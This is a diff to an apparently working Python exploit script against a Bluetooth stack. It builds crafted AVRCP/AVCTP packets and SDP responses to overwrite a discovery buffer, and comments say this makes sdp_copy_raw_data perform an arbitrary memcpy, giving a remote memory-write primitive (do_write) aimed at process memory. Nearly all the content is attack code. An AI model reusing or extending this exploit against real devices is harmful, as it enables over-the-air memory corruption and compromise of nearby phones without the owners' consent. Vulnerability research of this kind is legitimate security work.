@@ -80,7 +80,7 @@ async def main():
                 avrcp_controller_service_record_handle),
         }
 
-        requests = []
+        requests: list[sdp.SDP_ServiceSearchAttributeRequest] = []
 
         await device.power_on()
         connection = await device.connect(
@@ -96,6 +96,20 @@ async def main():
         avrcp_protocol = avrcp.Protocol()
         avrcp_protocol.listen(device)
         await avrcp_protocol.connect(connection)
+
+        def avctp_on_message_hook(
+            transaction_label: int,
+            is_command: bool,
+            ipid: bool,
+            pid: int,
+            payload: bytes,
+        ):
+            print(transaction_label, is_command, ipid, pid, payload)
+
+        don_t_have_a2dp = True
+        if don_t_have_a2dp:
+            avrcp_protocol.avctp_protocol.orig_on_message = avrcp_protocol.avctp_protocol.on_message
+            avrcp_protocol.avctp_protocol.on_message = avctp_on_message_hook
 
         # TODO(zhuowei): wait for EVENT_CONNECTION instead
         await asyncio.sleep(1)
@@ -139,13 +153,22 @@ async def main():
                 AvctMakePacket(0, avrcp.Protocol.PacketType.START, False,
                                False, 0x4141, avrcp_command_buf))
 
+            if len(requests) == 2 and "AudioSource" in str(requests[1]):
+                print("end audiosource")
+                device.sdp_server.send_response(
+                    sdp.SDP_ErrorResponse(
+                        transaction_id=requests[1].transaction_id,
+                        error_code=sdp.SDP_INVALID_SERVICE_RECORD_HANDLE_ERROR,
+                    ))
+            await asyncio.sleep(0.5)
+
             # now p_disc_db is overwritten with our avrcp packet
             # send sdp response, and sdp_copy_raw_data will do arbitrary memcpy
             sdp_attribute_list = bytes(
                 sdp.DataElement.sequence([target_buffer]))
             device.sdp_server.send_response(
                 sdp.SDP_ServiceSearchAttributeResponse(
-                    transaction_id=requests[1].transaction_id,
+                    transaction_id=requests[-1].transaction_id,
                     attribute_lists_byte_count=len(sdp_attribute_list),
                     attribute_lists=sdp_attribute_list,
                     continuation_state=bytes([0])))
@@ -156,7 +179,7 @@ async def main():
             await asyncio.sleep(0.5)
 
         # 76ccc61000-76d0c61000 rw-s 00000000 00:01 5731                           /memfd:jit-cache (deleted)
-        await do_write(0x7265f47000 + 0x2000000 + 0x2000, b"A" * 0x800)
+        await do_write(0x41414141_41414141, b"A" * 0x100)
 
 
 asyncio.run(main())
